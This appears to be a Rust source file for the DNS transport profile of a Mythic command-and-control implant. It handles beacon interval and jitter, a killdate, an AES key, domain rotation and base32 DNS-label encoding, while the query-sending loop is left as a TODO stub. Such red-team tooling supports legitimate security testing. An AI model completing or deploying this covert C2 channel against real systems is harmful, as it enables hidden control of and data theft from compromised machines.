use crate::profiles;
use crate::structs::{MythicMessage, Profile};
use crate::utils;
use crate::utils::crypto;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chrono::NaiveDate;
use data_encoding::BASE32_NOPAD;
use std::sync::atomic::{AtomicBool, AtomicI32, AtomicU32, Ordering};
use std::sync::RwLock;
use tokio::sync::mpsc;
use tokio::time::Duration;

// DNS protobuf definitions (generated by prost)
pub mod dns_structs {
    include!(concat!(env!("OUT_DIR"), "/dns_structs.rs"));
}

#[derive(Debug, Clone, serde::Deserialize)]
pub struct DnsInitialConfig {
    #[serde(rename = "callback_interval")]
    pub interval: i32,
    #[serde(rename = "callback_jitter")]
    pub jitter: i32,
    pub killdate: String,
    #[serde(rename = "encrypted_exchange_check")]
    pub encrypted_exchange_check: String,
    #[serde(rename = "AESPSK")]
    pub aes_psk: String,
    #[serde(default)]
    pub domains: Vec<String>,
    #[serde(default, rename = "dns_server")]
    pub dns_server: String,
    #[serde(default, rename = "domain_rotation")]
    pub domain_rotation: String, // "fail-over", "round-robin", "random"
    #[serde(default, rename = "max_retries")]
    pub max_retries: i32,
}

pub struct DnsProfile {
    interval: AtomicI32,
    jitter: AtomicI32,
    killdate: RwLock<NaiveDate>,
    encrypted_exchange_check: RwLock<String>,
    aes_key: RwLock<Option<Vec<u8>>>,
    uuid: RwLock<String>,
    domains: RwLock<Vec<String>>,
    dns_server: RwLock<String>,
    domain_rotation: RwLock<String>,
    max_retries: AtomicI32,
    current_domain_index: AtomicU32,
    domain_failure_counts: RwLock<Vec<i32>>,
    session_id: AtomicU32,
    message_id: AtomicU32,
    running: AtomicBool,
    should_stop: AtomicBool,
}

impl DnsProfile {
    pub fn new(config: DnsInitialConfig) -> Self {
        let aes_key = if !config.aes_psk.is_empty() {
            BASE64.decode(&config.aes_psk).ok()
        } else {
            None
        };

        let killdate = NaiveDate::parse_from_str(&config.killdate, "%Y-%m-%d")
            .unwrap_or_else(|_| NaiveDate::from_ymd_opt(2099, 12, 31).unwrap());

        let domain_count = config.domains.len();

        Self {
            interval: AtomicI32::new(config.interval),
            jitter: AtomicI32::new(config.jitter),
            killdate: RwLock::new(killdate),
            encrypted_exchange_check: RwLock::new(config.encrypted_exchange_check),
            aes_key: RwLock::new(aes_key),
            uuid: RwLock::new(profiles::get_uuid()),
            domains: RwLock::new(config.domains),
            dns_server: RwLock::new(config.dns_server),
            domain_rotation: RwLock::new(config.domain_rotation),
            max_retries: AtomicI32::new(config.max_retries.max(3)),
            current_domain_index: AtomicU32::new(0),
            domain_failure_counts: RwLock::new(vec![0; domain_count]),
            session_id: AtomicU32::new(rand::random()),
            message_id: AtomicU32::new(0),
            running: AtomicBool::new(false),
            should_stop: AtomicBool::new(false),
        }
    }

    /// Get the current domain to use for DNS queries
    fn get_current_domain(&self) -> Option<String> {
        let domains = self.domains.read().unwrap();
        if domains.is_empty() {
            return None;
        }

        let rotation = self.domain_rotation.read().unwrap();
        match rotation.as_str() {
            "random" => {
                let idx = utils::random_num_in_range(0, domains.len() as i32) as usize;
                Some(domains[idx].clone())
            }
            "round-robin" => {
                let idx = self.current_domain_index.fetch_add(1, Ordering::Relaxed)
                    % domains.len() as u32;
                Some(domains[idx as usize].clone())
            }
            _ => {
                // fail-over (default)
                let idx = self.current_domain_index.load(Ordering::Relaxed) as usize;
                if idx < domains.len() {
                    Some(domains[idx].clone())
                } else {
                    Some(domains[0].clone())
                }
            }
        }
    }

    /// Encode data as DNS-safe base32 labels
    fn encode_dns_labels(data: &[u8]) -> Vec<String> {
        let encoded = BASE32_NOPAD.encode(data).to_lowercase();
        // Split into 63-char labels (DNS label max)
        encoded
            .as_bytes()
            .chunks(63)
            .map(|c| String::from_utf8_lossy(c).to_string())
            .collect()
    }

    fn past_killdate(&self) -> bool {
        let killdate = self.killdate.read().unwrap();
        chrono::Local::now().date_naive() > *killdate
    }

    fn next_message_id(&self) -> u32 {
        self.message_id.fetch_add(1, Ordering::Relaxed)
    }
}

#[async_trait::async_trait]
impl Profile for DnsProfile {
    fn profile_name(&self) -> &str {
        "dns"
    }

    fn is_p2p(&self) -> bool {
        false
    }

    async fn start(&self) {
        self.running.store(true, Ordering::Relaxed);
        self.should_stop.store(false, Ordering::Relaxed);

        utils::print_debug("DNS: Profile starting");

        // Main loop - DNS uses polling
        while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
            let sleep_time = self.get_sleep_time();
            if sleep_time > 0 {
                tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
            }

            if self.should_stop.load(Ordering::Relaxed) {
                break;
            }

            // Build and send DNS query
            let _domain = match self.get_current_domain() {
                Some(d) => d,
                None => {
                    utils::print_debug("DNS: No domains configured");
                    break;
                }
            };

            // TODO: Build protobuf DnsPacket, encode as base32 DNS query
            // Send via hickory-client, decode response
        }

        self.running.store(false, Ordering::Relaxed);
        utils::print_debug("DNS: Profile stopped");
    }

    fn stop(&self) {
        self.should_stop.store(true, Ordering::Relaxed);
    }

    fn set_sleep_interval(&self, interval: i32) -> String {
        self.interval.store(interval, Ordering::Relaxed);
        format!("Updated interval to {}\n", interval)
    }

    fn get_sleep_interval(&self) -> i32 {
        self.interval.load(Ordering::Relaxed)
    }

    fn set_sleep_jitter(&self, jitter: i32) -> String {
        let j = jitter.clamp(0, 100);
        self.jitter.store(j, Ordering::Relaxed);
        format!("Updated jitter to {}%\n", j)
    }

    fn get_sleep_jitter(&self) -> i32 {
        self.jitter.load(Ordering::Relaxed)
    }

    fn get_sleep_time(&self) -> i32 {
        let interval = self.interval.load(Ordering::Relaxed);
        let jitter = self.jitter.load(Ordering::Relaxed);
        if jitter == 0 || interval == 0 {
            return interval;
        }
        let jitter_range = (interval as f64 * jitter as f64 / 100.0) as i32;
        let variation = utils::random_num_in_range(-jitter_range, jitter_range + 1);
        (interval + variation).max(0)
    }

    async fn sleep(&self) {
        let sleep_time = self.get_sleep_time();
        if sleep_time > 0 {
            tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
        }
    }

    fn get_kill_date(&self) -> NaiveDate {
        *self.killdate.read().unwrap()
    }

    fn set_encryption_key(&self, new_key: &str) {
        if let Ok(key) = BASE64.decode(new_key) {
            let mut aes_key = self.aes_key.write().unwrap();
            *aes_key = Some(key);
        }
    }

    fn get_config(&self) -> String {
        let domains = self.domains.read().unwrap();
        let rotation = self.domain_rotation.read().unwrap();
        let interval = self.interval.load(Ordering::Relaxed);
        format!(
            "  Domains: {:?}\n  Rotation: {}\n  Interval: {}s\n",
            domains, rotation, interval
        )
    }

    fn update_config(&self, parameter: &str, value: &str) {
        match parameter {
            "dns_server" => *self.dns_server.write().unwrap() = value.to_string(),
            "callback_interval" => {
                if let Ok(i) = value.parse::<i32>() {
                    self.interval.store(i, Ordering::Relaxed);
                }
            }
            _ => utils::print_debug(&format!("Unknown DNS config: {}", parameter)),
        }
    }

    fn get_push_channel(&self) -> Option<mpsc::Sender<MythicMessage>> {
        None
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}
